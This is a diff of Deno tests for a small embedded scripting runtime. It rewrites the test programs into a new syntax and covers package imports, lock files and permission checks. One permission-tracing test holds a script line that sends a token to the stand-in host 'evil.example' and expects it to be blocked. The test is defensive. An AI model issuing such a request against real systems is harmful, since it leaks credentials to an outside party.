@@ -28,14 +28,14 @@ const baseUrl = new URL("./nomanifest/", import.meta.url).href;
 Deno.test("deno: a packed package imports from inside itself", async () => {
     const enc = new TextEncoder();
     const framed = (bytes) => [...enc.encode(`${bytes.length}\n`), ...bytes];
-    const files = { "main.mini": "from .src.hello import hello\n", "src/hello.mini": "fn hello(name):\n    return 'hello ' + name\n", "https://example.com/dep.edge": "" };
+    const files = { "main.mini": "use .src.hello as hello\nhello = hello.hello\n", "src/hello.mini": "fn hello(name) {\n    return \"hello \" + name\n}\n", "https://example.com/dep.edge": "" };
     const packed = [...enc.encode("EDGEPKG\x01"), ...framed(enc.encode("main.mini")), ...enc.encode(`${Object.keys(files).length}\n`)];
     for (const [path, text] of Object.entries(files)) packed.push(...framed(enc.encode(path)), ...framed(enc.encode(text)));
     const dir = await Deno.makeTempDir();
     await Deno.writeFile(`${dir}/greet.edge`, new Uint8Array(packed));
     const engine = await boot("package", { greet: new URL(`file://${dir}/greet.edge`).href });
     const lines = [];
-    const { out } = await engine.run({ src: "from greet import hello\nprint(hello('edge'))" }, (t) => lines.push(t));
+    const { out } = await engine.run({ src: "use greet\nhello = greet.hello\nprint(hello(\"edge\"))" }, (t) => lines.push(t));
     if (out !== "" || lines.join("").trim() !== "hello edge") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
 });
 
@@ -49,13 +49,13 @@ Deno.test("deno: a packed package resolves its own version through the lock it c
         return new Uint8Array(out);
     };
     const dir = await Deno.makeTempDir();
-    const dep = pack("main.mini", { "main.mini": "fn shout(word):\n    return word.upper()\n" });
+    const dep = pack("main.mini", { "main.mini": "fn shout(word) {\n    return word.upper()\n}\n" });
     await Deno.writeFile(`${dir}/dep.edge`, dep);
     const digest = [...new Uint8Array(await crypto.subtle.digest("SHA-256", dep))].map((b) => b.toString(16).padStart(2, "0")).join("");
     const url = new URL(`file://${dir}/dep.edge`).href;
 
     const app = pack("main.mini", {
-        "main.mini": "from dep import shout\n\nfn greet(name):\n    return shout('hi ' + name)\n",
+        "main.mini": "use dep\nshout = dep.shout\n\nfn greet(name) {\n    return shout(\"hi \" + name)\n}\n",
         "edge.json": JSON.stringify({ imports: { dep: "0.1.0" } }),
         "edge.lock": JSON.stringify({ dep: { version: "0.1.0", url, digest: `sha256-${digest}` } }),
     });
@@ -63,7 +63,7 @@ Deno.test("deno: a packed package resolves its own version through the lock it c
 
     const engine = await boot("lock", { app: new URL(`file://${dir}/app.edge`).href });
     const lines = [];
-    const { out } = await engine.run({ src: "from app import greet\nprint(greet('edge'))" }, (t) => lines.push(t));
+    const { out } = await engine.run({ src: "use app\ngreet = app.greet\nprint(greet(\"edge\"))" }, (t) => lines.push(t));
     if (out !== "" || lines.join("").trim() !== "HI EDGE") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
 });
 
@@ -80,7 +80,7 @@ Deno.test("deno: a version no lock holds names the lock", async () => {
     const engine = await boot("unlocked", { app: new URL(`file://${dir}/app.edge`).href });
     let failed = "";
     try {
-        await engine.run({ src: "import app" });
+        await engine.run({ src: "use app" });
     } catch (e) {
         failed = String(e);
     }
@@ -89,17 +89,17 @@ Deno.test("deno: a version no lock holds names the lock", async () => {
 
 Deno.test("deno: an undeclared name fails at compile time", async () => {
     const engine = await boot("undeclared");
-    const { out } = await engine.run({ src: "import json\nprint(1)" });
+    const { out } = await engine.run({ src: "use json\nprint(1)" });
     if (!out.includes("module 'json' is not provided by this host and no edge.json declares it")) throw new Error(`unexpected output ${JSON.stringify(out)}`);
 });
 
 Deno.test("deno: send() names the actor scheduler it lacks", async () => {
     const engine = await boot("send");
     const lines = [];
-    const missing = "send() needs an actor scheduler, missing in this runtime";
-    const caught = await engine.run({ src: "try:\n    send('g', 'x')\nexcept RuntimeError as e:\n    print(e)" }, (t) => lines.push(t));
+    const missing = "send needs an actor scheduler which this runtime lacks";
+    const caught = await engine.run({ src: "try {\n    send(\"g\", \"x\")\n} catch Error as e {\n    print(e)\n}" }, (t) => lines.push(t));
     if (caught.out !== "" || lines.join("").trim() !== missing) throw new Error(`unexpected ${JSON.stringify([caught.out, lines])}`);
-    const { out } = await engine.run({ src: "send('g', 'x')" });
+    const { out } = await engine.run({ src: "send(\"g\", \"x\")" });
     if (!out.includes(missing) || !out.includes("<input>:1:1")) throw new Error(`unexpected output ${JSON.stringify(out)}`);
 });
 
@@ -108,11 +108,11 @@ Deno.test("deno: a manifest beside a module joins its relative targets once", as
     await Deno.mkdir(`${dir}/pkg`);
     await Deno.writeTextFile(`${dir}/edge.json`, JSON.stringify({ imports: { pkg: "./pkg/entry.mini" } }));
     await Deno.writeTextFile(`${dir}/pkg/edge.json`, JSON.stringify({ imports: { _impl: "./impl.mini" } }));
-    await Deno.writeTextFile(`${dir}/pkg/entry.mini`, "from _impl import value\n");
+    await Deno.writeTextFile(`${dir}/pkg/entry.mini`, "use _impl\nvalue = _impl.value\n");
     await Deno.writeTextFile(`${dir}/pkg/impl.mini`, "value = 42\n");
     const engine = await boot("facade", {}, `file://${dir}/`);
     const lines = [];
-    const { out } = await engine.run({ src: "from pkg import value\nprint(value)" }, (t) => lines.push(t));
+    const { out } = await engine.run({ src: "use pkg\nvalue = pkg.value\nprint(value)" }, (t) => lines.push(t));
     await Deno.remove(dir, { recursive: true });
     if (out !== "" || lines.join("").trim() !== "42") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
 });
@@ -139,7 +139,7 @@ async function output(name, src, base) {
 // No JavaScript loads besides the host's own, so an import of one fails where it is written.
 Deno.test("deno: a JavaScript import is refused at compile time", async () => {
     const base = await project({ "edge.json": JSON.stringify({ imports: { charts: "./charts.js" } }), "charts.js": "export const draw = () => 1;\n" });
-    const got = await output("javascript", "from charts import draw", base);
+    const got = await output("javascript", "use charts\ndraw = charts.draw", base);
     if (!got.out.includes("module 'charts' is JavaScript, ship a .mini or a .wasm")) throw new Error(`unexpected ${JSON.stringify(got)}`);
 });
 
@@ -245,9 +245,9 @@ Deno.test("deno: a composition without perms gives every package each module it 
     const base = await project({ "edge.json": JSON.stringify({ imports: { main: "./lib.mini" }, permissions: "read by nobody" }), "lib.mini": "value = 7\n" });
     await engine.load({ wasmUrl: WASM, baseUrl: base });
     const lines = [];
-    const src = "import net\nfrom main import value\n\nr = net.request('GET', 'http://127.0.0.1:1/')\ntry:\n    net.response(r)\nexcept OSError as e:\n    print(value, r > 0, 'unbounded')";
+    const src = "use net\nuse main\nvalue = main.value\n\nr = net.request(\"GET\", \"http://127.0.0.1:1/\")\ntry {\n    net.response(r)\n} catch IOError as e {\n    print(value, r > 0, \"unbounded\")\n}";
     const { out } = await engine.run({ src }, (t) => lines.push(t));
-    if (out !== "" || lines.join("").trim() !== "7 True unbounded") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
+    if (out !== "" || lines.join("").trim() !== "7 true unbounded") throw new Error(`unexpected ${JSON.stringify([out, lines])}`);
 });
 
 /* a module of the test's own beside net shows only its name and outcome */
@@ -258,7 +258,7 @@ Deno.test("deno: a traced run reports each call as its module shows it", async (
     engine.access(perms);
     await engine.load({ wasmUrl: WASM, trace: true, permissions: { main: ["net:127.0.0.1", "probe"] } });
     const events = [];
-    const src = "import net\nimport probe\n\nprint(probe.ping('secret'))\ntry:\n    net.request('GET', 'https://evil.example/x?token=t-456')\nexcept PermissionError as e:\n    pass";
+    const src = "use net\nuse probe\n\nprint(probe.ping(\"secret\"))\ntry {\n    net.request(\"GET\", \"https://evil.example/x?token=t-456\")\n} catch PermissionError as e {\n}";
     const { out } = await engine.run({ src }, () => {}, (event) => events.push(event));
     const said = JSON.stringify(events);
     const call = (name) => events.find((event) => event.kind === "call" && event.call === name);
@@ -300,8 +300,8 @@ Deno.test("deno: only the root package writes a file channel", async () => {
     const base = await project({
         "edge.json": JSON.stringify({ imports: { util: "./util/main.mini" }, permissions: { main: [] } }),
         "util/edge.json": "{}",
-        "util/main.mini": "fn write():\n    send('file:report.txt', 'from util')\n",
-        "main.mini": "import util\nsend('file:mine.txt', 'from main')\ntry:\n    util.write()\nexcept PermissionError as e:\n    print(e)\n",
+        "util/main.mini": "fn write() {\n    send(\"file:report.txt\", \"from util\")\n}\n",
+        "main.mini": "use util\nsend(\"file:mine.txt\", \"from main\")\ntry {\n    util.write()\n} catch PermissionError as e {\n    print(e)\n}\n",
     });
     const engine = await boot("sender", {}, base);
     const [lines, sent] = [[], []];
